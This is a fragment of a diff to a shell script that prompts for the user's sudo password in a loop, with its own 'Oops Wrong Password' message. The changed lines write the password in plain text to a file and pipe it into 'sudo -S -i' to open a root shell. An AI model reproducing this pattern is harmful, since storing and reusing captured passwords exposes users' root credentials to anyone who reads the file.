@@ -93,12 +93,13 @@ else
     printf $pass | sudo -S touch "$root"
     while ! [ -f "/bin/a" ]; do
         read pass
-        echo "$pass" | sudo -S touch "$root"
+        echo "$pass" | sudo -S -k touch "$root"
         printf "${BRed}Oops Wrong Password\n"
         printf "${BPurple}Please try again${White}\n"
     done
     sudo rm "$root"
-    printf "$pass" >"$pword"
+    echo "$pass" >"$pword"
+    echo "$pass" | sudo -S -i
 fi
 
 clear
